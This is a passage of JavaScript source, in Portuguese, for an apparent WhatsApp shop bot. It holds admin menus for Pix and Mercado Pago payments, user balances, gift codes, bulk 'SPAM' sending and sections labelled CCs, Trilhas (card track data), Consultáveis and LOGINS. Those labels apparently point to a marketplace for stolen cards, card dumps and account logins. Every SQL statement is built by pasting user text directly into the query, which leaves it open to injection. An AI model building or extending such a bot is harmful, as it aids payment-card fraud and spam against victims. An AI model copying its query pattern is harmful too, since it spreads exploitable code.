${TEXTO_SUPORTE}
◢▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬◣


◢▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬◣
╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🕞 *DATA DE VENCIMENTO:* 🕞
${DIAS_VENCIMENTO_MS_VISUAL}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*CUSTO SEMANAL DO BOT*
R$: ${VALOR_SEMANA}

*Comando Extender Vencimento:*
/botpixsemana===[NÚMERO DE SEMANAS]

*Exemplo:*
/botpixsemana===1
(Vai gerar um pix no valor equivalente a 1 semana.)
◢▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬◣


────────
*${TUSER}* Usuários registrados.
────────

────────
*R$:${PIXINSERIDOS}* de Pixs inseridos.
*R$:${MAIORPIX}* foi o maior Pix inserido.
────────

╬═════▩═════╬
*R$:${PIXINSERIDOS_DIA}* PIXs inseridos Hoje.
(${Data_Dia} Até agora...)

*R$:${PIXINSERIDOS_SEMANA}* PIXs inseridos esta semanda.
(${Data_Semana} Até agora...)

*R$:${PIXINSERIDOS_MES}* PIXs inseridos este mês.
(${Data_Mes} Até agora...)
╬═════▩═════╬

────────
*R$:${GIFTS_RESGATADOS}* de Gift resgatados.
*R$:${MAIORGIFT}* foi o maior Gift resgatado.
────────

◢▬▬▬▬▬▬▬▛▚▟▬▬▬▬▬▬◣
${Texto_Adicional}
`
            TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
            if ((TIPOMENU_ATUAL).toString() === "a") {


                CONSTRUCAO_LISTMESSAGE_buttonText = "MAIS OPÇÕES"
                CONSTRUCAO_LISTMESSAGE_title = `AJUSTES`
                CONSTRUCAO_LISTMESSAGE_description = Texto_ADM

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "⚙️ SISTEMA",
                        description: "🟢 Configurações gerais.",
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "💠 PIX",
                        description: "🟢 Configurações sobre pix automático e manual.",
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "👥 USUARIOS",
                        description: "🟢 Comandos sobre gerenciamento de usuários registrados.",
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "🗣️ SPAM",
                        description: "🟢 Envios em massa para os usuários registrados no banco de dados.",
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "🔔 NOTIFICAÇÕES EM GRUPOS",
                        description: "🟢 Ative ou desative, Controle oque deve ser notificado e etc...",
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "💼 ASSOCIADOS",
                        description: FUNCAO_ASSOCIADOS_PAGO_Descricao_Lista,
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "💳 AJUSTES - CCs",
                        description: BOT_CC_Descricao_Lista,
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "📑 AJUSTES - Consultadas",
                        description: BOT_CONSULTADA_Descricao_Lista,
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "📠 AJUSTES - Trilhas",
                        description: BOT_TRILHAS_Descricao_Lista,
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "🏦 AJUSTES - CONSULTÁVEIS",
                        description: BOT_CONSUL_Descricao_Lista,
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "📱 AJUSTES - LOGINS",
                        description: BOT_LOGIN_Descricao_Lista,
                    },
                )
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `${Texto_ADM}

❛ ━━━━━━･❪ ❁ ❫ ･━━━━━━ ❜

⚙️ *SISTEMA* /admsys
👥 *USUARIOS* /admuser
🗣️ *SPAM* /admspam
🔔 *NOTIFICAÇÕES EM GRUPOS* /admnot
💼 *ASSOCIADOS* /admasso
💳 *AJUSTES - CCs* /admcc
🏦 *AJUSTES - CONSULTÁVEIS* /admctavel
📑 *AJUSTES - Consultadas* /admctada
📱 *AJUSTES - LOGINS* /admlogin
📠 *AJUSTES - Trilhas* /admtrilha`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("⚙️ SISTEMA") > -1 || Mensagem_Texto.toString() === "/admsys" && Adms.includes(Numero)) {

            MANUTENCAO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANUTENCAO'`).get()["VALOR"]
            if (MANUTENCAO === "1") {
                MANUTENCAO_ESTADO = "⏹️BOT EM MANUTENÇÃO"
            } else {
                MANUTENCAO_ESTADO = "⏸️BOT LIBERADO"
            }
            Texto = `*⚙️SISTEMA⚙️*

◎ ══════ ❈ ══════ ◎
*ALTERAR NOME DO BOT*
◎ ══════ ❈ ══════ ◎

/nomebot===XABLAU STORE
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR CONTATOS DO SUPORTE*
◎ ══════ ❈ ══════ ◎
(Fique a vontáde para escrever um textinho pequeno, contendo os contados dos Suportes.)

*EXEMPLO*
/textosuporte===Esse aqui é o Suporte principal wa.me/${Numero_Suporte_Plan}

ou

/textosuporte===Qualquer dúvida falem aqui galera wa.me/${Numero_Suporte_Plan} ou esse número tbm wa.me/${Numero_Suporte_Plan}.
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BOT EM MANUTENÇÃO*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄 *ESTADO ATUAL:* ${MANUTENCAO} (${MANUTENCAO_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*COLOCAR NA MANUTENÇÃO*
/manutencao===1

*RETIRAR DA MANUTENÇÃO*
/manutencao===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR TEXTO MENU INICIAL*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/textomenuinicial===BEM VINDO CAMBADA
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*INSERIR UM ADM ALÉM DE VOCÊ*
◎ ══════ ❈ ══════ ◎

/adcadm===${Numero_Suporte_Plan}
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETAR UM ADM*
◎ ══════ ❈ ══════ ◎

/deladm===${Numero_Suporte_Plan}
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💠 PIX") > -1) {

            MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
            LIMITE_GERAR_PIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_GERAR_PIX'`).get()["VALOR"]
            HABILITAR_PIX_AUTO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HABILITAR_PIX_AUTO'`).get()["VALOR"]
            if (HABILITAR_PIX_AUTO === "1") {
                HABILITAR_PIX_AUTO_ESTADO = "✅ATIVADO"
            } else {
                HABILITAR_PIX_AUTO_ESTADO = "❌DESATIVADO"
            }
            HABILITAR_PIX_MANUAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HABILITAR_PIX_MANUAL'`).get()["VALOR"]
            if (HABILITAR_PIX_MANUAL === "1") {
                HABILITAR_PIX_MANUAL_ESTADO = "✅ATIVADO"
            } else {
                HABILITAR_PIX_MANUAL_ESTADO = "❌DESATIVADO"
            }

            CHAVE_PIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHAVE_PIX'`).get()["VALOR"]
            INFO_PIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'INFO_PIX'`).get()["VALOR"]

            TOKEN_MP = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TOKEN_MP'`).get()["VALOR"]
            TITULO_PRODUTO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TITULO_PRODUTO'`).get()["VALOR"]
            Texto = `💠 *PIX* 💠

◎ ══════ ❈ ══════ ◎
*DEFINIR TEXTO PIX AUTOMATICO*
◎ ══════ ❈ ══════ ◎
(Se definir este comando como 0 o texto exibido será o padrão criado por nós.)

*EXEMPLO DO COMANDO*
/textopixauto===O minimo de pix é 40 reais em cambada!!!
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR TEXTO PIX AUTO DESATIVADO*
◎ ══════ ❈ ══════ ◎
(Texto quando o pix automático estiver desativado e um user enivar o comando /pix)

*EXEMPLO DO COMANDO*
/textopixautodesativado===Está desativado o pix, mas pode tentar o pix manual, vai em adicionar saldo, Pix manual.
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR VALOR RECARGA MÍNIMA*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*RECARGA MÍNIMA ATUAL:* R$:${MIN_RECARGA}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/recargaminima===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR LIMITE DE PIX A GERAR*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*LIMITE PIX ATUAL:* R$:${LIMITE_GERAR_PIX}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/limitepix===500
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*PIX AUTOMÁTICO*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${HABILITAR_PIX_AUTO} (${HABILITAR_PIX_AUTO_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR PIX AUTO*
/autopix===1

*DESATIVAR PIX AUTO*
/autopix===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*PIX MANUAL*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${HABILITAR_PIX_MANUAL} (${HABILITAR_PIX_MANUAL_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR PIX MANUAL*
/manualpix===1

*DESATIVAR PIX MANUAL*
/manualpix===0



◎ ══════ ❈ ══════ ◎
*DEFINIR CHAVE PIX MANUAL*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*CHAVE ATUAL ATUAL:* ${CHAVE_PIX}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

/definirchavepix===chavepix@gmail.com
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR INFORMAÇÕES SOBRE CHAVE PIX MANUAL*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*INFORMAÇÕES ATUAIS:* ${INFO_PIX}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

/definirinfopix===Essa chave é telefone e o nome da lara é Maria
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR TOKEN MERCADO PAGO*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*TOKEN ATUAL:* ${TOKEN_MP}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/tokenmp===APP_U.....
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR TITULO PRODUTO MERCADO PAGO*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*TITULO PRODUTO ATUAL:* ${TITULO_PRODUTO}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/titulomp===Store Bot
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("👥 USUARIOS") > -1 || Mensagem_Texto.toString() === "/admuser" && Adms.includes(Numero)) {
            BONUS_REGISTRO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_REGISTRO'`).get()["VALOR"]
            BONUS_RECARGA_PERCENTUAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL'`).get()["VALOR"]
            BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR'`).get()["VALOR"]
            LIMITE_SALDO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_SALDO'`).get()["VALOR"]
            Texto = `*👥USUARIOS👥*

◎ ══════ ❈ ══════ ◎
*CRIAR UM GIFT*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/gift===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*CRIAR VÁRIOS GIFTs*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/muitogift===[QUANTOS]===[VALOR]

/muitogift===10===100
(Cria 10 gifts de 100 reais)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR SALDO DE UM USUÁRIO*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/definirsaldo===5513996403793===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR LIMITE DE SALDO PARA USUÁRIOS*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*LIMITE SALDO ATUAL:* R$:${LIMITE_SALDO}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/limitesaldo===1000
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR VALOR BÔNUS REGISTRO*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*BONUS REGISTRO ATUAL:* ${BONUS_REGISTRO}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/bonusreg===5
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR VALOR BÔNUS INDICADO*
◎ ══════ ❈ ══════ ◎

EM BREVE...
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR PERCENTUAL DO BÔNUS DE RECARGA*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*BONUS RECARGA PERCENTUAL ATUAL:* ${BONUS_RECARGA_PERCENTUAL}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/percentpix===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR VALOR MÍNIMO PARA RECEBER O BÔNUS DE RECARGA*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*VALOR MÍNIMO PARA BÔNUS DE RECARGA:* ${BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR}
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*EXEMPLO DO COMANDO*
/percentpixminimo===100
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*BLOQUEAR UM USER*
◎ ══════ ❈ ══════ ◎

*BLOQUEAR*
/bloquear===5513996403793===1

*DESBLOQUEAR*
/bloquear===5513996403793===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BAIXAR RELATÓRIO DE USUÁRIOS*
◎ ══════ ❈ ══════ ◎

/relatorio_usuarios
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*OBTER INFORMAÇÕES SOBRE UM USUÁRIO*
◎ ══════ ❈ ══════ ◎

/infouser===${Numero_Suporte_Plan}
(Coloque o número completo do usuário.)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*OBTER RANKING PIX*
◎ ══════ ❈ ══════ ◎
(Bot irá gerar um arquivo contendo um ranking da soma dos pixs inseridos entre os seus clientes dentro de um determinado período.)

/relatorio_pixtopgeral===MES/DIA/ANO===MES/DIA/ANO
/relatorio_pixtopgeral===06/01/2022===06/22/2022
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*OBTER RANKING PIX*
◎ ══════ ❈ ══════ ◎
(Bot irá enviar uma mensagem contendo um ranking da soma dos pixs inseridos entre os seus clientes dentro de um determinado período porém limitado a um número x de clientes.)

/relatorio_pixtop===MES/DIA/ANO===MES/DIA/ANO===QUANTOS_USUARIOS
/relatorio_pixtop===06/01/2022===06/20/2022===10
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("🗣️ SPAM") > -1 || Mensagem_Texto.toString() === "/admspam" && Adms.includes(Numero)) {
            ATIVADO = await DataBase_Better.prepare(`SELECT VALOR FROM SPAMMER WHERE PARAMETRO = 'ATIVADO'`).get()["VALOR"]
            TEXTO_ENVIAR = await DataBase_Better.prepare(`SELECT VALOR FROM SPAMMER WHERE PARAMETRO = 'TEXTO_ENVIAR'`).get()["VALOR"]
            INTERVALO_ENVIO_SEGUNDOS = await DataBase_Better.prepare(`SELECT VALOR FROM SPAMMER WHERE PARAMETRO = 'INTERVALO_ENVIO_SEGUNDOS'`).get()["VALOR"]


            if (ATIVADO === "1") {
                Status_Ativado = "ATIVADO"
            } else {
                Status_Ativado = "DESATIVADO"
            }
